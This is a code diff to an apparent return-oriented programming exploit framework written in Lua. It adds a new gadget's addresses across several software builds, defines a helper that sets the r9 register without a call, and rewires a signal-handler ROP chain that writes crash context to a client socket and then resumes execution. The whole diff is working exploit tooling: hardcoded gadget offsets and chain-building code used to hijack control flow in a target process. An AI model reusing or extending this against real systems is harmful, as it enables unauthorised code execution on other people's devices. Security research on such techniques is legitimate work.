@@ -44,6 +44,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x135aea,
             ["mov [rax + 0x28], rdx; ret"] = 0x148b9f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd0bbe,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x116792,
             ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd0d7f,
@@ -100,6 +101,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x13c4fa,
             ["mov [rax + 0x28], rdx; ret"] = 0x14f43f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd753e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d452,
             ["add rax, r8; ret"] = 0xa7a3,
 
             ["mov [rdi], rsi; ret"] = 0xd76ff,
@@ -158,6 +160,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x1368da,
             ["mov [rax + 0x28], rdx; ret"] = 0x14967f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd30ae,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x117882,
             ["add rax, r8; ret"] = 0x9de0,
 
             ["mov [rdi], rsi; ret"] = 0xd326f,
@@ -215,6 +218,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x13550a,
             ["mov [rax + 0x28], rdx; ret"] = 0x1485bf,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd05de,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x1161b2,
             ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd079f,
@@ -252,6 +256,7 @@ gadget_table = {
             gettimeofday_import = 0x11c010, -- syscall wrapper
         }
     },
+    -- not supporting new mov r9, consider dropping
     c = {
         gadgets = {    
             ["ret"] = 0x4c,
@@ -272,6 +277,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x12c5ff,
             ["mov [rax + 0x28], rdx; ret"] = 0x14439f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xcbc3e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = nil,
             ["add rax, r8; ret"] = 0x116d16,
 
             ["mov [rdi], rsi; ret"] = 0xcbe0f,
@@ -329,6 +335,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x13b120,
             ["mov [rax + 0x28], rdx; ret"] = 0x14d97f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd575e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11c2c2,
             ["add rax, r8; ret"] = 0x125b56,
 
             ["mov [rdi], rsi; ret"] = 0xd592f,
@@ -386,6 +393,7 @@ gadget_table = {
             ["mov [rax + 8], rcx; ret"] = 0x13c6ea,
             ["mov [rax + 0x28], rdx; ret"] = 0x14f62f,
             ["mov [rcx + 0xa0], rdi; ret"] = 0xd772e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d642,
             ["add rax, r8; ret"] = 0xa7a3,
 
             ["mov [rdi], rsi; ret"] = 0xd78ef,
@@ -1575,6 +1583,15 @@ function ropchain:push_set_r9(v) -- clobber rax, rbx / r13, r14, r15, rax
     end
 end
 
+function ropchain:push_set_r9_wo_call(v) -- clobber rax, rsi, r8
+    temp_addr = bump.alloc(0x8)
+    memory.write_qword(self.recover_from_call, v)
+    self:push_set_rax(self.recover_from_call - 0x18)
+    self:push_set_rsi(0)
+    self:push_set_r8(temp_addr)
+    self:push(gadgets["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"])
+end
+
 function ropchain:push_load_rax_from_memory(addr)
     self:push_set_rax(addr)
     self:push(gadgets["mov rax, [rax]; ret"])
@@ -2235,7 +2252,6 @@ function signal_handler()
 end
 
 function signal_handler_rop(client_fd)
-    -- TODO: Restore execution if two crashes in one payload
     output = string.rep("\0", 0x10)
     ucontext_struct = string.rep("\1", 0x8)
     local output_addr = ropchain.resolve_value(output)
@@ -2251,10 +2267,10 @@ function signal_handler_rop(client_fd)
     chain:push_store_rdx_into_memory(ucontext_struct_addr)
     
     chain:push_set_rdi(ropchain.resolve_value(client_fd))
+    chain:push_set_r9_wo_call(0)
     chain:push_set_rsi(ropchain.resolve_value(output))
     chain:push_set_rdx(ropchain.resolve_value(#output))
     chain:push_set_r8(0)
-    chain:push_set_r9(0)
     chain:push_set_rax(4) -- syscall_num=write
     chain:push_fcall_raw(WRITE_ADDR)
     
@@ -2275,7 +2291,7 @@ function signal_handler_rop(client_fd)
     -- write to rop chain
     rst_chain:push_store_rax_data_and_add_into_memory(0xfb000390, 0x8) -- write value to push_set_rsp()
     
-    rst_chain:push_set_r9(0)
+    rst_chain:push_set_r9_wo_call(0)
     rst_chain:push_set_r8(0)
     rst_chain:push_set_rsi(0)
     rst_chain:push_set_rdx(0)
